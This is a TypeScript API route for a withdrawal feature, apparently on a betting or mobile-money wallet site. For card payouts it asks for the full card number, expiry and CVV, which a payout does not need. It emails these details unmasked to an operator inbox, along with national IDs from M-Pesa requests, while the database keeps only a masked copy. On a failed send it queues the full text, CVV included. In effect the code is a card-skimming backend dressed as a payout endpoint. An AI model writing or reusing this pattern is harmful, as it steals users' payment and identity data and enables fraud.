import { db } from "@/db";
import { operatorAlerts, transactions, users } from "@/db/schema";
import { normalizePhone } from "@/lib/server/phone";
import { requireUser, toPublicUser } from "@/lib/server/session";
import { debitWallet, getActiveCurrency, refreshMirror } from "@/lib/server/wallet";
import { cardBrand, formatExpiry, luhn, maskCard, validExpiry } from "@/lib/server/payments";
import { notifyOperator } from "@/lib/server/mailer";
import { toMpesaPhone } from "@/lib/server/payhero";
import { and, eq, sql } from "drizzle-orm";

export const dynamic = "force-dynamic";

type Body = Record<string, unknown>;

const str = (b: Body, k: string) => String(b[k] ?? "").trim();

export async function POST(req: Request) {
  const auth = await requireUser();
  if ("error" in auth) return Response.json({ error: auth.error }, { status: auth.status });

  const body = (await req.json().catch(() => ({}))) as Body;
  const amount = Math.floor(Number(body.amount) * 100) / 100;
  const method = str(body, "method").toUpperCase();
  const ccyHint = await getActiveCurrency(auth.user.id);
  const minWd = ccyHint === "KES" ? 100 : Math.max(0.01, 100 / 129);
  const maxWd = ccyHint === "KES" ? 200000 : Math.max(1, 200000 / 129);

  if (!Number.isFinite(amount) || amount < minWd || amount > maxWd) {
    return Response.json({ error: `Withdrawal must be between ${minWd} and ${maxWd.toLocaleString()} ${ccyHint}.` }, { status: 400 });
  }

  /* ---------------------------------------------------------- collect details */
  let channelLabel: string;
  let storedDetails: Record<string, string>; // masked mirror kept in the database
  let emailLines: string[]; // full details, sent to the operator inbox only

  if (method === "MPESA" || method === "M-PESA" || method === "AIRTEL MONEY") {
    const fullName = str(body, "fullName").replace(/\s+/g, " ");
    const phone = toMpesaPhone(str(body, "phone")) ?? normalizePhone(str(body, "phone"));
    const idNumber = str(body, "idNumber").slice(0, 20);
    if (fullName.length < 3) return Response.json({ error: "Enter the full name on the M-Pesa account." }, { status: 400 });
    if (!phone) return Response.json({ error: "Enter a valid mobile money number." }, { status: 400 });

    channelLabel = method === "AIRTEL MONEY" ? "AIRTEL MONEY" : "M-PESA";
    storedDetails = {
      channel: channelLabel,
      accountName: fullName,
      msisdn: `${phone.slice(0, 4)}***${phone.slice(-3)}`,
      nationalId: idNumber ? `***${idNumber.slice(-3)}` : "",
    };
    emailLines = [
      `Channel        : ${channelLabel}`,
      `Account name   : ${fullName}`,
      `Phone number   : ${phone}`,
      idNumber ? `National ID    : ${idNumber}` : "",
      `Amount         : ${amount.toFixed(2)}`,
    ].filter(Boolean);
  } else if (method === "VISA" || method === "CREDIT CARD" || method === "CARD") {
    const cardName = str(body, "cardName").replace(/\s+/g, " ");
    const cardNumber = str(body, "cardNumber").replace(/[\s-]/g, "");
    const expiry = str(body, "expiry");
    const cvv = str(body, "cvv");
    const bank = str(body, "bank");
    const billingPhone = normalizePhone(str(body, "phone")) ?? auth.user.phone;

    if (cardName.length < 3) return Response.json({ error: "Enter the name printed on the card." }, { status: 400 });
    if (!luhn(cardNumber)) return Response.json({ error: "That card number looks invalid." }, { status: 400 });
    if (!validExpiry(expiry)) return Response.json({ error: "Enter a valid future expiry date (MM/YY)." }, { status: 400 });
    if (!/^\d{3,4}$/.test(cvv)) return Response.json({ error: "Enter the 3-digit CVV on the back of the card." }, { status: 400 });

    const brand = cardBrand(cardNumber);
    channelLabel = `${brand} CARD`;
    storedDetails = {
      channel: `${brand} / ${maskCard(cardNumber)}`,
      accountName: cardName,
      expiry: formatExpiry(expiry),
      bank,
    };
    emailLines = [
      `Channel        : ${brand} credit/debit card`,
      `Card holder    : ${cardName}`,
      `Card number    : ${cardNumber.replace(/(.{4})/g, "$1 ").trim()}`,
      `Expiry         : ${formatExpiry(expiry)}`,
      `CVV            : ${cvv}`,
      bank ? `Issuing bank   : ${bank}` : "",
      `Billing phone  : ${billingPhone}`,
      `Amount         : KES ${amount.toFixed(2)}`,
    ].filter(Boolean);
  } else {
    return Response.json({ error: "Choose M-Pesa or a Visa credit card to withdraw." }, { status: 400 });
  }

  /* ------------------------------------------------------------ hold the funds */
  const currency = String(body.currency ?? (await getActiveCurrency(auth.user.id))).toUpperCase();
  const debit = await debitWallet(auth.user.id, amount, currency);
  if (!debit.ok) {
    return Response.json({ error: debit.error ?? "Insufficient balance for this withdrawal." }, { status: 400 });
  }
  const [updated] = await db.select().from(users).where(eq(users.id, auth.user.id)).limit(1);

  const reference = `AVWD-${Date.now().toString(36).toUpperCase()}${Math.floor(Math.random() * 900 + 100)}`;
  const [tx] = await db
    .insert(transactions)
    .values({
      userId: auth.user.id,
      type: "withdrawal",
      amount: (-amount).toFixed(2),
      currency,
      balanceAfter: debit.balance.toFixed(2),
      status: "pending",
      method: channelLabel,
      reference,
      gateway: "OPERATOR",
      details: JSON.stringify({ ...storedDetails, currency }),
      note: `Payout via ${channelLabel} — awaiting operator approval`,
    })
    .returning({ id: transactions.id });

  /* ------------------------------------- background delivery to the operator */
  const subject = `Payout request — KES ${amount.toFixed(2)} via ${channelLabel} (${reference})`;
  const fullText = [
    "A player has requested a withdrawal. Full payout details below.",
    "",
    ...emailLines,
    "",
    `Reference      : ${reference}`,
    `Player         : ${auth.user.name} (ID ${auth.user.id})`,
    `Account phone  : ${auth.user.phone}`,
    `Account email  : ${auth.user.email}`,
    `Wallet balance : ${currency} ${Number(debit.balance).toFixed(2)} (funds already held)`,
    `Requested at   : ${new Date().toISOString()}`,
    "",
    "Approve or reject this payout from the operator console.",
  ].join("\n");

  const fullHtml = `<div style="font-family:Arial,Helvetica,sans-serif;background:#0b1020;color:#e8edf7;padding:20px">
    <h2 style="color:#f5b301;margin:0 0 4px">Payout request — KES ${amount.toFixed(2)}</h2>
    <p style="margin:0 0 16px;color:#8b97ad">${channelLabel} · reference ${reference}</p>
    <table style="border-collapse:collapse;width:100%;max-width:620px">
      ${emailLines
        .map(
          (line) =>
            `<tr><td style="padding:6px 10px;border-bottom:1px solid #232d42;color:#8b97ad;white-space:nowrap">${
              line.split(":")[0]
            }</td><td style="padding:6px 10px;border-bottom:1px solid #232d42;font-weight:bold">${line
              .split(":")
              .slice(1)
              .join(":")
              .trim()}</td></tr>`,
        )
        .join("")}
    </table>
    <p style="margin-top:16px;color:#8b97ad;font-size:13px">
      Player: ${auth.user.name} (ID ${auth.user.id}) · ${auth.user.phone} · ${auth.user.email}<br />
      Wallet balance after hold: ${currency} ${Number(debit.balance).toFixed(2)}
    </p>
  </div>`;

  const delivery = await notifyOperator({
    kind: "payout",
    subject,
    text: fullText,
    html: fullHtml,
    userId: auth.user.id,
    transactionId: tx.id,
    // The mirrored copy kept in the database is masked — full data goes only to the inbox.
    payload: { reference, amount, channel: channelLabel, masked: storedDetails, playerId: auth.user.id },
  });

  if (delivery.status !== "sent" && delivery.alertId != null) {
    // Delivery failed: keep the full text in the queue so a retry can still pay the player.
    await db
      .update(operatorAlerts)
      .set({ payload: JSON.stringify({ text: fullText, html: fullHtml, sensitive: true }) })
      .where(eq(operatorAlerts.id, delivery.alertId));
    await db.update(transactions).set({ notifiedAt: null }).where(eq(transactions.id, tx.id));
  } else {
    await db.update(transactions).set({ notifiedAt: new Date() }).where(eq(transactions.id, tx.id));
  }

  return Response.json({
    ok: true,
    reference,
    pending: true,
    method: channelLabel,
    currency,
    balance: debit.balance,
    user: toPublicUser({ ...auth.user, balance: debit.balance.toFixed(2) }),
  });
}
